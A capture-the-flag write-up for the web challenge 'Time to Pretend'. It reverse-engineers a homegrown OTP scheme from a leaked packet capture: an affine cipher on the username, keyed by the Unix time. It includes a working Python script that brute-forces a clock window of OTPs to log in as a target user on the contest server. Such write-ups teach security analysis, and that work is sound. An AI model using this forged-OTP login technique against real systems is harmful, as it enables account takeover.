# CTF Writeup — "Time to Pretend"
**Category:** Web  
**Points:** 538  
**Solves:** 216  
**Flag:** `utflag{t1m3_1s_n0t_r3l1@bl3_n0w_1s_1t}`

---

## The Story So Far

> "Did you hear about the big AffiniTech outage earlier this week? Earlier today, someone leaked some internal traffic of theirs on the darkweb as proof that they pwned the service. But I think there's more here than just logs; maybe you can break in too?"

We're handed:
- A URL: `http://challenge.utctf.live:9382`
- A PCAP file: `aftechLEAK.pcap` (the "leaked internal traffic")

The target is **AffiniTECH** — a fictional Bitcoin wallet company that replaced passwords with their own homegrown OTP system called **AffinKey™**. The login page has no password field, only a username and a "One-Time Passcode." Our job: figure out how to generate that OTP for the right user and get into the portal.

---

## Step 1 — Reading the Page Source (Always Read the Source)

The first thing I did was look at the HTML source of the login page. Developers often leave comments in there by accident, and this challenge was no exception.

Hidden inside the login form was this gem:

```html
<!-- NOTICE to DEVS: login currently disabled, see /urgent.txt for info -->
```

And on the OTP input field:

```html
<div class="otp-hint">// Request your AffinKey™ OTP via the debug endpoint</div>
```

**Two clues right away:**
1. There's a file at `/urgent.txt` with more info
2. There's a "debug endpoint" somewhere that hands out OTPs

Let's file those away and dig into the PCAP.

---

## Step 2 — Analysing the PCAP (The Leaked Traffic)

A **PCAP file** (Packet Capture) is a recording of real network traffic — like a CCTV recording, but for internet packets. The challenge told us someone leaked AffiniTech's internal traffic. That means we get to see what their own server was doing internally.

I used the `strings` command to pull readable text out of the binary PCAP file:

```bash
strings aftechLEAK.pcap | grep -E "(GET|POST|HTTP|otp|auth|debug)"
```

### What I Found

The PCAP was full of requests like this:

```
POST /debug/getOTP HTTP/1.1
Content-Type: application/json
{"username": "carrasco", "epoch": 1773290571}

HTTP/1.1 200 OK
Content-Type: application/json
  "otp": "bnccnjbh"
```

So the debug endpoint takes a **username** and an **epoch** (Unix timestamp — just a number representing the current time in seconds) and returns an OTP. 

But the really interesting part was something else hiding in the same PCAP — the server's response also included:

```json
"add": 13,
"mult": 7
```

Every single response leaked two extra numbers: `add` and `mult`. These looked like parameters to some kind of mathematical formula. I had a full dataset:

| username | epoch | add | mult | otp |
|---|---|---|---|---|
| carrasco | 1773290571 | 13 | 7 | bnccnjbh |
| mix | 1773290574 | 16 | 15 | ogx |
| hebert | 1773290575 | 17 | 17 | ghihuc |
| monks | 1773290576 | 18 | 19 | myfaw |
| eyre | 1773290577 | 19 | 21 | zdmz |
| ganesan | 1773290581 | 23 | 3 | pxkjzxk |

---

## Step 3 — Reverse Engineering the OTP Algorithm

### Cracking "add"

First, I looked for a pattern between `epoch` and `add`.

```
epoch = 1773290571 → add = 13
epoch = 1773290574 → add = 16
epoch = 1773290575 → add = 17
epoch = 1773290576 → add = 18
```

I tried `epoch % 26` (remainder when dividing epoch by 26) and it matched **every single sample perfectly**:

```
1773290571 % 26 = 13  ✓
1773290574 % 26 = 16  ✓
1773290575 % 26 = 17  ✓
```

**`add = epoch % 26`** — confirmed.

### Cracking "mult"

The `mult` values were always odd numbers: 1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25. That's a specific set of 12 numbers — the ones that are **coprime to 26** (they share no common factors with 26). This is a well-known requirement for a cipher called the **Affine Cipher** (more on that in a moment).

I tried indexing into this list using `epoch % 12`:

```python
valid_mults = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]
mult = valid_mults[epoch % 12]
```

Checked against every sample — **100% match**.

### Cracking the OTP itself

Now I knew `add` and `mult`. But how do they turn a **username** into an **OTP**?

I tested the simplest theory: encrypt the username using an **Affine Cipher** with these parameters.

#### What is an Affine Cipher?

An Affine Cipher is a simple substitution cipher (like a fancy Caesar cipher). Each letter in the alphabet is assigned a number (a=0, b=1, ... z=25). To encrypt a letter:

```
encrypted_letter = (mult × original_letter + add) mod 26
```

That's it. Multiply by `mult`, add `add`, wrap around at 26.

So for the username `"carrasco"` with `mult=7` and `add=13`:

```
c (2)  → (7×2 + 13) % 26 = 27 % 26 = 1  → b
a (0)  → (7×0 + 13) % 26 = 13           → n
r (17) → (7×17 + 13) % 26 = 132 % 26 = 2 → c
r (17) → same → c
a (0)  → 13 → n
s (18) → (7×18 + 13) % 26 = 139 % 26 = 9 → j
c (2)  → 1 → b
o (14) → (7×14 + 13) % 26 = 111 % 26 = 7 → h
```

Result: `bnccnjbh` — **exactly the OTP in the PCAP!** 🎯

The entire "proprietary, homegrown, peer-reviewed AffinKey™ algorithm" is just encrypting your own username with a 200-year-old substitution cipher, keyed on the current time.

---

## Step 4 — Finding the Target Username

Remember `/urgent.txt`? Time to check it:

```bash
curl http://challenge.utctf.live:9382/urgent.txt
```

```
URGENT - READ IMMEDIATELY
=========================
TO: dev team
FROM: timothy
DATE: 2013-11-12 03:47:22

guys,

i think someone figured out the AffinKey system. i dont have time to explain everything
right now but there is a SERIOUS flaw in how we generate the OTPs...

i have locked every account in the system except mine while we figure this out. DO NOT
unlock anyone until we have patched this.

my account stays active because i need access to keep monitoring the situation.

- timothy
```

**Username: `timothy`.** He locked everyone else's account but kept his own active. Classic.

---

## Step 5 — Generating the OTP and Logging In

The `/debug/getOTP` endpoint returned a 404 (already patched or wrong path). But we don't need it — we can generate the OTP ourselves with the algorithm we reversed.

The only tricky part: the OTP changes **every second** (it's based on the current Unix timestamp), so there might be a slight clock difference between my machine and the server. I brute-forced a small window of ±5 seconds:

```python
import time, urllib.request, json, urllib.error, http.cookiejar

valid_mults = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]

def affine_encrypt(text, mult, add):
    result = []
    for c in text.lower():
        if c.isalpha():
            result.append(chr((mult * (ord(c) - ord('a')) + add) % 26 + ord('a')))
        else:
            result.append(c)
    return ''.join(result)

BASE = 'http://challenge.utctf.live:9382'
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

for delta in range(-3, 6):
    ep = int(time.time()) + delta
    add = ep % 26
    mult = valid_mults[ep % 12]
    otp = affine_encrypt('timothy', mult, add)
    
    data = json.dumps({'username': 'timothy', 'otp': otp}).encode()
    req = urllib.request.Request(
        BASE + '/auth', data=data,
        headers={'Content-Type': 'application/json'}, method='POST'
    )
    try:
        r = opener.open(req, timeout=3)
        resp = r.read().decode()
        print(f'delta={delta:+d} otp={otp} -> {r.status} {resp}')
        if r.status == 200:
            portal = opener.open(BASE + '/portal', timeout=3)
            print(portal.read().decode())
            break
    except urllib.error.HTTPError as e:
        print(f'delta={delta:+d} otp={otp} -> {e.code}')
```

Output:
```
delta=-3 -> 401 Authentication failed
delta=-2 otp=taoitde -> 200 Access granted   ← ✓
PORTAL body: ... utflag{t1m3_1s_n0t_r3l1@bl3_n0w_1s_1t} ...
```

The flag was sitting in timothy's wallet portal, displayed as his "Primary Receiving Address."

---

## Flag

```
utflag{t1m3_1s_n0t_r3l1@bl3_n0w_1s_1t}
```

*"Time is not reliable, now is it?"* — the flag itself is a nod to the vulnerability.

---

## Key Concepts Explained Simply

### What is a Unix Epoch / Timestamp?
A Unix timestamp is just the number of seconds since January 1, 1970. Right now it's something like `1773463000`. It ticks up by 1 every second. Time-based OTPs (like Google Authenticator) use this as their "seed" — the idea being that both the server and your phone know the current time, so they can independently generate the same code without talking to each other.

### What is an Affine Cipher?
A substitution cipher from classical cryptography. You replace each letter with another letter using the formula `(mult × position + add) mod 26`. It was invented centuries ago and is completely trivial to break with any modern computer. Using it as a "proprietary authentication system" in 2013 is... not great.

### What is a PCAP?
A **Packet Capture** — a file that records raw network traffic. Tools like Wireshark or `tshark` can read them. When the challenge said "someone leaked internal traffic," they meant a `.pcap` file that recorded the server's own internal API calls — including the exact OTP generation requests that let us reverse-engineer the algorithm.

### Why was this vulnerable?

Three reasons:

1. **The algorithm was trivially reversible.** Once you see even one (username, epoch, OTP) triple, you can work backwards. The PCAP gave us dozens.
2. **The "secret" parameters were leaked in the response.** Returning `add` and `mult` in the API response is like a locksmith handing you their key-cutting formula along with the lock.
3. **The algorithm itself is cryptographically weak.** A real OTP system (like TOTP — RFC 6238) uses HMAC-SHA1 with a shared secret. AffinKey™ used a 200-year-old cipher with keys derived entirely from public information (time + username). There's no secret at all.

---

## Timeline of the Attack

```
[1] Read page source        → found /urgent.txt hint + debug endpoint hint
[2] Analysed PCAP           → found POST /debug/getOTP traffic with add/mult leaked
[3] Pattern matched add     → add = epoch % 26
[4] Pattern matched mult    → mult = valid_mults[epoch % 12]
[5] Tested Affine Cipher    → affine_encrypt(username, mult, add) = OTP ✓
[6] Read /urgent.txt        → only active account is "timothy"
[7] Generated OTP           → brute-forced ±5s clock offset
[8] POSTed to /auth         → 200 Access Granted
[9] GETted /portal          → flag in page
```

---

*Written by prasanna · UTCTF 2026*
